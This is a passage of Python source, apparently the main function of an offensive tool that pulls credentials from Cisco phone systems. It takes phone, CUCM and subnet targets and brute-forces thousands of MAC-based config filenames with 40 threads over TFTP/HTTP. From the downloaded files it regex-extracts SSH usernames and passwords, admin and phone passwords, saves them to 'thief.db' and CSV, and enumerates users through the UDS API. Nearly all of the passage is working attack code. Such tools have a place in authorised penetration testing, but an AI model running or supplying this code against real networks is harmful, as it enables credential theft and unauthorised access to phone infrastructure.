    banner()

    parser = argparse.ArgumentParser(description='Penetration toolkit for extracting credentials from Cisco phone systems')
    
    # Target Specification
    parser.add_argument('-H','--host', default=None, type=str, help='Specify CUCM (Cisco Unified Communications Manager) IP address')
    parser.add_argument('-p','--phone', type=str, action='append', help='Specify Cisco phone IP address (repeatable for multiple targets)')
    parser.add_argument('--gowitness', type=str, metavar='DB_FILE', help='Load phone targets from gowitness SQLite database')
    parser.add_argument('-e','--enumsubnet', type=str, help='Enumerate and attack entire subnet in CIDR notation (e.g., 192.168.1.0/24)')
    
    # Attack Options
    parser.add_argument('-b','--brute-mac', action='store_true', default=False, help='Brute force all MAC address variations (00-FF) for detected phone prefixes')
    parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
    parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
    
    # Output Options
    parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
    parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Specify output file for enumerated usernames (default: cucm_users.txt)')
    
    # Database Options
    parser.add_argument('--db', type=str, metavar='FILENAME', default='thief.db', help='Specify SQLite database for caching results (default: thief.db)')
    parser.add_argument('--no-db', action='store_true', default=False, help='Disable database caching and operate without persistent storage')
    parser.add_argument('--show-db', action='store_true', default=False, help='Display summary of credentials stored in database and exit')
    
    # Debugging
    parser.add_argument('-d','--debug', action='store_true', default=False, help='Enable verbose output including all failed attempts and TFTP operations')

    args = parser.parse_args()

    # Handle --show-db early (display database summary and exit)
    if args.show_db:
        db_file = args.db
        cucm_filter = args.host
        display_database_summary(db_file, cucm_filter)
        quit(0)

    CUCM_host = args.host
    phones = args.phone if args.phone else []
    gowitness_db = args.gowitness
    
    # Load phones from gowitness database if specified
    if gowitness_db:
        gowitness_phones = get_phones_from_gowitness(gowitness_db)
        if gowitness_phones:
            phones.extend(gowitness_phones)
        else:
            print('[-] Failed to load phones from gowitness database')
            if not phones:
                print('[-] No phones available. Exiting.')
                quit(1)
    
    use_tftp = True  # TFTP is default, with automatic HTTP fallback
    
    # Set debug flag so worker threads can access it
    debug = args.debug
    
    enumsubnet = args.enumsubnet
    brute_mac = args.brute_mac
    csv_output = args.csv
    db_file = args.db
    no_db = args.no_db
    force_download = args.force
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []
    outfile = args.outfile
    
    # Initialize database unless --no-db is set
    if not no_db:
        init_database(db_file)
    
    # Enable tftpy logging only in debug mode
    if debug:
        logging.getLogger('tftpy.TftpClient').setLevel(logging.DEBUG)
        logging.getLogger('tftpy.TftpContexts').setLevel(logging.DEBUG)
        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.DEBUG)
        logging.getLogger('tftpy').setLevel(logging.DEBUG)

    get_version(CUCM_host)

    # Handle MAC brute forcing from detected phones
    if brute_mac:
        if not phones:
            print('You must specify at least one phone with -p when using --brute-mac')
            quit(1)
        
        print(f'MAC brute force mode enabled for {len(phones)} phone(s)\n')
        
        # Map each MAC prefix to its CUCM server
        mac_to_cucm = {}
        all_found_macs = set()
        
        # Detect MACs and CUCM from each phone
        successful_detections = 0
        failed_detections = 0
        
        for phone in phones:
            print(f'[{phones.index(phone) + 1}/{len(phones)}] Detecting MAC address from phone {phone}...')
            
            try:
                # Try to get hostname/MAC from phone
                hostname = get_hostname_from_phone(phone)
                if hostname:
                    # Extract MAC from hostname (SEP + 12 hex chars)
                    mac_match = re.search(r'SEP([0-9A-F]{12})', hostname, re.IGNORECASE)
                    if mac_match:
                        full_mac = mac_match.group(1).upper()
                        partial_mac = full_mac[:9]
                        print(f'  ✓ Detected: SEP{full_mac}')
                        
                        # Detect CUCM for this specific phone
                        if CUCM_host:
                            phone_cucm = CUCM_host
                        else:
                            phone_cucm = get_cucm_name_from_phone(phone)
                            if not phone_cucm:
                                print(f'  ✗ Could not detect CUCM host from phone {phone}')
                                print(f'  → Skipping this phone, continuing with others...\n')
                                failed_detections += 1
                                continue
                        
                        print(f'  ✓ CUCM Server: {phone_cucm}')
                        print(f'  → Using partial MAC: {partial_mac} for brute force\n')
                        
                        all_found_macs.add(partial_mac)
                        mac_to_cucm[partial_mac] = phone_cucm
                        successful_detections += 1
                    else:
                        print(f'  ✗ Could not extract MAC from hostname: {hostname}')
                        print(f'  → Skipping this phone, continuing with others...\n')
                        failed_detections += 1
                else:
                    print(f'  ✗ Could not detect hostname from phone {phone}')
                    print(f'  → Phone may be unreachable or not a Cisco device')
                    print(f'  → Skipping this phone, continuing with others...\n')
                    failed_detections += 1
            except KeyboardInterrupt:
                print(f'\n[!] Interrupted by user. Stopping phone detection.')
                break
            except Exception as e:
                print(f'  ✗ Error detecting MAC from {phone}: {str(e)}')
                print(f'  → Skipping this phone, continuing with others...\n')
                failed_detections += 1
        
        print(f'Phone detection complete: {successful_detections} succeeded, {failed_detections} failed\n')
        
        if not all_found_macs:
            print('No MAC addresses detected. Cannot proceed with brute force.')
            quit(1)
        
        # Build combined list of all MAC candidates from all phones
        print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
        all_candidates = []
        
        for partial_mac in all_found_macs:
            phone_cucm = mac_to_cucm[partial_mac]
            # Generate all 4096 variations for this MAC prefix
            for i in range(4096):
                last_three_chars = f'{i:03X}'
                full_mac = partial_mac + last_three_chars
                filename = f'SEP{full_mac}.cnf.xml'
                all_candidates.append((phone_cucm, full_mac, filename))
        
        # Randomize the order to distribute load across different MAC prefixes
        random.shuffle(all_candidates)
        print(f'Randomized {len(all_candidates)} total candidates across all phones\n')
        
        # ============================================================================
        # Multi-threaded brute force download (ONLY used for brute force mode)
        # Regular downloads use single-threaded search_for_secrets() function
        # ============================================================================
        
        # Process all candidates with multi-threading
        # Use the args values that were set earlier (no need for globals().get since they're in scope)
        # db_file, no_db, and force_download are already defined above
        
        print(f'Starting multi-threaded brute force with 40 workers...')
        
        work_queue = queue.Queue()
        results_queue = queue.Queue()
        backoff_manager = TFTPBackoffManager()
        num_threads = 40
        
        # Create and start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(
                target=download_worker,
                args=(work_queue, results_queue, None, use_tftp, backoff_manager, no_db, db_file, force_download),
                daemon=True,
                name=f'Worker-{i}'
            )
            t.start()
            threads.append(t)
        
        try:
            print(f'[*] Started {num_threads} worker threads')
            print(f'[*] Queuing {len(all_candidates)} download tasks...')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        # Queue all candidates
        for idx, (cucm, full_mac, filename) in enumerate(all_candidates):
            work_queue.put((idx, full_mac, filename, cucm))
            if (idx + 1) % 10000 == 0:
                try:
                    print(f'  Queued {idx + 1}/{len(all_candidates)} tasks...', flush=True)
                except (ValueError, AttributeError):
                    pass  # stdout closed or unavailable
        
        try:
            print(f'[*] All {len(all_candidates)} tasks queued', flush=True)
            print(f'[*] Processing downloads with {num_threads} workers (this may take several minutes)...\n', flush=True)
        except (ValueError, AttributeError):
            pass
        
        # Process results with progress bar
        all_configs = []
        found_macs = []
        skipped = 0
        successful = 0
        processed = 0
        
        # Use alive_bar only if output is to a terminal
        use_progress_bar = sys.stdout.isatty()
        
        if use_progress_bar:
            with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
                for _ in range(len(all_candidates)):
                    try:
                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
                        
                        if was_cached:
                            skipped += 1
                        
                        if content:
                            all_configs.append((full_mac, content))
                            found_macs.append(full_mac)
                            successful += 1
                            # Update progress bar title with current count
                            prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
                        
                        prog_bar()
                            
                    except queue.Empty:
                        print('[!] Timeout waiting for results')
                        break
        else:
            # Simple text-based progress for non-TTY output
            try:
                print(f'[*] Starting to process results...')
                sys.stdout.flush()
                
                last_status_time = time.time()
                for _ in range(len(all_candidates)):
                    try:
                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
                        processed += 1
                        
                        if was_cached:
                            skipped += 1
                        
                        if content:
                            all_configs.append((full_mac, content))
                            found_macs.append(full_mac)
                            successful += 1
                            print(f'[+] Found config #{successful}: SEP{full_mac}')
                            sys.stdout.flush()
                        
                        # Print progress every 1000 items or every 5 seconds
                        current_time = time.time()
                        if processed % 1000 == 0 or (current_time - last_status_time) >= 5:
                            remaining = len(all_candidates) - processed
                            print(f'[*] Progress: {processed}/{len(all_candidates)} processed ({successful} found, {remaining} remaining)')
                            sys.stdout.flush()
                            last_status_time = current_time
                            
                    except queue.Empty:
                        remaining = len(all_candidates) - processed
                        print(f'[!] Timeout after processing {processed}/{len(all_candidates)} items ({remaining} remaining)')
                        break
                    except Exception as e:
                        print(f'[!] ERROR in results processing: {type(e).__name__}: {e}')
                        import traceback
                        traceback.print_exc()
                        sys.stdout.flush()
                        break
            except Exception as outer_e:
                print(f'[!] FATAL ERROR in else block: {type(outer_e).__name__}: {outer_e}')
                import traceback
                traceback.print_exc()
                sys.stdout.flush()
        
        # Wait for all queued work to be completed
        try:
            print(f'\n[*] Waiting for all workers to finish processing...')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        work_queue.join()
        
        try:
            print(f'[*] All tasks completed!')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        # Send poison pills to stop workers
        for _ in range(num_threads):
            work_queue.put(None)
        
        # Wait for all workers to exit gracefully
        for t in threads:
            t.join()
        
        # Print summary
        if found_macs:
            mac_list = ', '.join([f"SEP{mac}" for mac in found_macs[:10]])
            suffix = ", ..." if len(found_macs) > 10 else ""
            print(f'\n[+] Found {len(found_macs)} config(s): {mac_list}{suffix}')
        
        if skipped > 0:
            print(f'[*] Skipped {skipped} cached config(s) from previous successful downloads (use --force to re-download)')
        
        print(f'Brute force complete: {successful}/{len(all_candidates)} configs found')
        
        # Process all found configs
        if all_configs:
            print(f'\n\n{"="*60}')
            print(f'SUMMARY: {len(all_configs)} configuration files found!')
            print("="*60)
            
            # Get CUCM host for logging (use first one from mapping)
            summary_cucm = list(mac_to_cucm.values())[0] if mac_to_cucm else 'Multiple-CUCM-Servers'
            
            # Collect all findings
            all_found_credentials = []
            all_found_usernames = []
            devices_with_creds = {}
            devices_with_users = {}
            
            for mac, content in all_configs:
                # Search for secrets in this config
                config_creds = []
                config_users = []
                
                # Track username across the config file
                user = ''
                user2 = ''
                
                for line in content.split('\n'):
                    match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
                    if match:
                        if match.group(2):
                            user = match.group(2)
                            config_users.append((user, f'SEP{mac}'))
                        if match.group(3):
                            password = match.group(3)
                            config_creds.append((user, password, f'SEP{mac}'))
                        if match.group(4):
                            user2 = match.group(4)
                            config_users.append((user2, f'SEP{mac}'))
                        if match.group(5):
                            password = match.group(5)
                            config_creds.append((user if user else 'unknown', password, f'SEP{mac}'))
                
                # Track devices with findings
                if config_creds:
                    devices_with_creds[f'SEP{mac}'] = config_creds
                    all_found_credentials.extend(config_creds)
                
                if config_users:
                    devices_with_users[f'SEP{mac}'] = config_users
                    all_found_usernames.extend(config_users)
            
            # Display results
            if all_found_credentials or all_found_usernames:
                print(f'\n\n{"="*70}')
                print(f'{"CREDENTIALS DISCOVERY SUMMARY":^70}')
                print("="*70)
                
                if all_found_credentials:
                    print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(all_found_credentials)} total)\033[0m')
                    print("-"*70)
                    print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
                    print("-"*70)
                    for device, creds in devices_with_creds.items():
                        for cred in creds:
                            username = cred[0] if cred[0] else 'N/A'
                            password = cred[1]
                            print(f'{device:<20} {username:<20} \033[91m{password:<20}\033[0m')
                
                if all_found_usernames:
                    print(f'\n\033[1m[+] USERNAMES FOUND ({len(all_found_usernames)} total)\033[0m')
                    print("-"*70)
                    print(f'{"Device":<20} {"Username":<20}')
                    print("-"*70)
                    for device, users in devices_with_users.items():
                        for username in users:
                            print(f'{device:<20} {username[0]:<20}')
                
                print(f'\n{"="*70}')
                print(f'\n\033[1mSTATISTICS:\033[0m')
                print(f'  • Total configs downloaded:     {len(all_configs)}')
                print(f'  • Devices with credentials:     {len(devices_with_creds)}')
                print(f'  • Devices with usernames only:  {len(devices_with_users)}')
                print(f'  • Total credentials discovered: {len(all_found_credentials)}')
                print(f'  • Total usernames discovered:   {len(all_found_usernames)}')
                if len(mac_to_cucm) > 1:
                    unique_cucms = set(mac_to_cucm.values())
                    print(f'  • CUCM servers:                 {", ".join(sorted(unique_cucms))}')
                print("="*70)
                
                # Log to database (unless --no-db)
                if not no_db:
                    log_credentials_to_db(summary_cucm, all_found_credentials, all_found_usernames, db_file)
                
                # Export to CSV if requested
                if csv_output:
                    csv_filename = csv_output if csv_output != True else 'seeyoucm_results.csv'
                    export_to_csv(all_found_credentials, all_found_usernames, csv_filename)
            else:
                print(f'\n\n{"="*70}')
                print(f'  No credentials or usernames found in {len(all_configs)} configs')
                print("="*70)
        else:
            print('\nNo configuration files found')
        
        quit(0)

    if enumsubnet:
        hosts = enumerate_phones_subnet(enumsubnet)
        for host in hosts:
            found_credentials.clear()
            found_usernames.clear()
            if CUCM_host is None:
                CUCM_host = get_cucm_name_from_phone(host["ip"])
            if hostname_resolves(CUCM_host):
                file_names = get_config_names(CUCM_host, hostnames=[host["hostname"]])
                for file in file_names:
                    print('Connecting to {CUCM_host} and getting config for {host}/{hostname}'.format(CUCM_host=CUCM_host,host=host["ip"],hostname=host["hostname"]))
                    search_for_secrets(CUCM_host, file, use_tftp)
                if found_credentials != []:
                    print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
                if found_usernames != []:
                    print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
            print("\n")
        quit(0)
    elif phones:
        # Process multiple phones
        for phone in phones:
            found_credentials.clear()
            found_usernames.clear()
            print(f'\nProcessing phone: {phone}')
            
            if args.host is None:
                CUCM_host = get_cucm_name_from_phone(phone)
            else:
                CUCM_host = args.host
            
            if CUCM_host is None:
                print('Unable to automatically detect the CUCM Server for {phone}. Skipping...')
                continue
            else:
                print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
            
            # Get hostnames for this phone
            hostnames = [get_hostname_from_phone(phone)]
            hostnames += get_phones_hostnames_from_reverse(phone)
            
            # Get config files
            file_names = get_config_names(CUCM_host, hostnames=hostnames)
            if file_names is None:
                print('Unable to detect file names from CUCM for {}'.format(phone))
                continue
            
            # Search for secrets
            for file in file_names:
                search_for_secrets(CUCM_host, file, use_tftp)
            
            # Display results for this phone
            if found_credentials != []:
                print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
            
            if found_usernames != []:
                print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
        
        quit(0)
    elif args.host:
        CUCM_host = args.host
    else:
        print('You must enter either a phone IP address or the IP address of the CUCM server')
        quit(1)
    file_names = get_config_names(CUCM_host)
    if file_names is None:
        if phones:
            hostnames = [get_hostname_from_phone(phones[0])]
            hostnames += get_phones_hostnames_from_reverse(phones[0])

        if hostnames == []:
            file_names = get_config_names(CUCM_host)
        else:
            file_names = get_config_names(CUCM_host, hostnames=hostnames)

    if file_names is None:
        print('Unable to detect file names from CUCM')
    else:
        for file in file_names:
            search_for_secrets(CUCM_host, file, use_tftp)

    if found_credentials != []:
        print('Credentials Found in Configurations!')
        for cred in found_credentials:
            print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))

    if found_usernames != []:
        print('Usernames Found in Configurations!')
        for usernames in found_usernames:
            print('{0}\t{1}'.format(usernames[0],usernames[1]))
    if args.userenum:
        print('Getting users from UDS API.')
        #each API call is limited by default to 64 users per request
        api_users = get_users_api(CUCM_host)
        if api_users != []:
            unique_users = set(api_users)
            api_users = list(unique_users)
            with open(outfile, mode='w') as outputfile:
                for line in api_users:
                    outputfile.write(line+'\n')
            print(f'The following {len(api_users)} users were identified from the UDS API')
            if debug:
                for username in api_users:
                    print('{0}'.format(username))

